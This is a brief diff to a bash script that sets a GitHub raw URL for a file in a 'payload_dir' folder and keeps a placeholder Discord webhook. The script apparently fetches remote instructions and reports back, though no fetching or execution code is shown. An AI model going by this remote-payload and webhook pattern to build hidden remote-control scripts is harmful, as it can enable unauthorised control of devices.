@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # URL of the liverun.txt on GitHub (make sure to get the raw URL from GitHub)
-GITHUB_URL="https://raw.githubusercontent.com/yourteam/yourrepo/main/liverun.txt"
+GITHUB_URL="https://raw.githubusercontent.com/hl-mrGoose/Figura-Pi/refs/heads/main/payload_dir/liverun.txt?_sm_au_=iVVPZf52vw4rJ425qCs6FKQctT8sW"
 
 # Discord Webhook URL
 WEBHOOK_URL="https://discord.com/api/webhooks/your-webhook-id"
